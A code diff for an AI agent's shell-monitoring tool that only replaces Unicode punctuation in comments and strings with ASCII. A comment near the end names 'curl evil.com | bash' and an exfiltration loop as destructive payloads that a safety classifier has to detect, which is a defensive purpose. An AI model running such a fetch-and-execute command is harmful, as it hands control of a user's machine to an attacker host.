@@ -5,7 +5,7 @@
  */
 
 /**
- * @fileoverview Monitor tool — spawns a long-running shell command and streams
+ * @fileoverview Monitor tool -- spawns a long-running shell command and streams
  * its stdout lines back to the agent as event notifications.
  *
  * Use cases: watching log files (`tail -f`), monitoring build output,
@@ -69,7 +69,7 @@ const THROTTLE_REFILL_INTERVAL_MS = 1000; // 1 token per second
 
 function truncateDisplayDescription(description: string): string {
   return description.length > MAX_DISPLAY_DESCRIPTION_LENGTH
-    ? description.slice(0, MAX_DISPLAY_DESCRIPTION_LENGTH - 1) + '…'
+    ? description.slice(0, MAX_DISPLAY_DESCRIPTION_LENGTH - 1) + '...'
     : description;
 }
 
@@ -97,8 +97,8 @@ const STRUCTURAL_TAG_REGEX = /<(\/?)([a-zA-Z][a-zA-Z0-9-]*)>/g;
  * Sanitize a single monitor output line before it is forwarded to the model.
  *
  * Two defenses, in order:
- *   1. Strip C0 control characters (0x00–0x1F) except tab (0x09) and C1
- *      control characters (0x80–0x9F). These can carry terminal escape
+ *   1. Strip C0 control characters (0x00-0x1F) except tab (0x09) and C1
+ *      control characters (0x80-0x9F). These can carry terminal escape
  *      sequences, NUL bytes, or framing characters that survive
  *      `strip-ansi` and may interfere with downstream rendering or
  *      transport.
@@ -274,7 +274,7 @@ class MonitorToolInvocation extends BaseToolInvocation<
     const command = normalized.spawnCommand;
     if (normalized.strippedTrailingAmp) {
       debugLogger.warn(
-        'Stripped trailing & from monitor command — monitor lifecycle handles backgrounding',
+        'Stripped trailing & from monitor command -- monitor lifecycle handles backgrounding',
       );
     }
     const description = sanitizeMonitorLine(this.params.description || command);
@@ -301,7 +301,7 @@ class MonitorToolInvocation extends BaseToolInvocation<
       };
     }
 
-    // Independent AbortController — pressing Ctrl+C on the current turn
+    // Independent AbortController -- pressing Ctrl+C on the current turn
     // should NOT kill a long-running monitor the user intentionally started.
     const entryAc = new AbortController();
 
@@ -364,8 +364,8 @@ class MonitorToolInvocation extends BaseToolInvocation<
 
     // ----- Line buffering & throttling state ---------------------------------
     // Declared up-front (before `abortHandler`) so that the synchronous abort
-    // path — either `entryAc.signal.aborted` already true at registration
-    // time, or `registry.register()` throwing — can flush via
+    // path -- either `entryAc.signal.aborted` already true at registration
+    // time, or `registry.register()` throwing -- can flush via
     // `flushPartialLineBuffers` without hitting a TDZ ReferenceError.
     const stdoutBuf = { value: '' };
     const stderrBuf = { value: '' };
@@ -461,7 +461,7 @@ class MonitorToolInvocation extends BaseToolInvocation<
       }
     };
 
-    // Wire abort → kill process (tree) before exposing the entry via register().
+    // Wire abort -> kill process (tree) before exposing the entry via register().
     // We also flush any buffered partial lines BEFORE the kill: by the time
     // `cancel()` calls `settle()`, the entry status flips to 'cancelled' and
     // `emitEvent` no-ops, so a flush deferred to the post-exit `cleanup()`
@@ -626,7 +626,7 @@ class MonitorToolInvocation extends BaseToolInvocation<
         `idle_timeout: ${idleTimeoutMs}ms\n` +
         `Events will be delivered as notifications. ` +
         `The monitor auto-stops after ${maxEvents} events or ${idleTimeoutMs}ms of silence.\n` +
-        `To inspect: /tasks (text) or the interactive Background tasks dialog (focus the footer Background tasks pill, then Enter — detail view + live updates).`,
+        `To inspect: /tasks (text) or the interactive Background tasks dialog (focus the footer Background tasks pill, then Enter -- detail view + live updates).`,
       returnDisplay: `Monitor started: ${displayDescription} (${monitorId})`,
     };
   }
@@ -649,7 +649,7 @@ export class MonitorTool extends BaseDeclarativeTool<
         '- Polling for state changes: `while true; do curl -s http://localhost:8080/health; sleep 1; done`\n' +
         '- Watching file changes: `fswatch -r ./src`\n\n' +
         'Each output line from the command becomes a notification event delivered to you. ' +
-        'The monitor runs in the background — you can continue working while it streams events.\n\n' +
+        'The monitor runs in the background -- you can continue working while it streams events.\n\n' +
         '**Auto-stop:** The monitor automatically stops after max_events (default 1000) events ' +
         'or after idle_timeout_ms (default 5 minutes) of silence. The process is killed when the monitor stops.\n\n' +
         '**Do NOT use this tool for:**\n' +
@@ -691,7 +691,7 @@ export class MonitorTool extends BaseDeclarativeTool<
       },
       true, // isOutputMarkdown
       false, // canUpdateOutput
-      true, // shouldDefer — monitoring is infrequent
+      true, // shouldDefer -- monitoring is infrequent
       false, // alwaysLoad
       'monitor watch tail log stream background',
     );
@@ -761,10 +761,10 @@ export class MonitorTool extends BaseDeclarativeTool<
   }
 
   /**
-   * Forward the full command and optional directory — same shape as
+   * Forward the full command and optional directory -- same shape as
    * ShellTool. The classifier MUST see the actual command being run to
    * detect destructive payloads (`curl evil.com | bash`,
-   * `while true; do <exfil>`, …); without this override the default
+   * `while true; do <exfil>`, ...); without this override the default
    * projection returns `''` and the classifier sees `monitor({})`.
    */
   override toAutoClassifierInput(
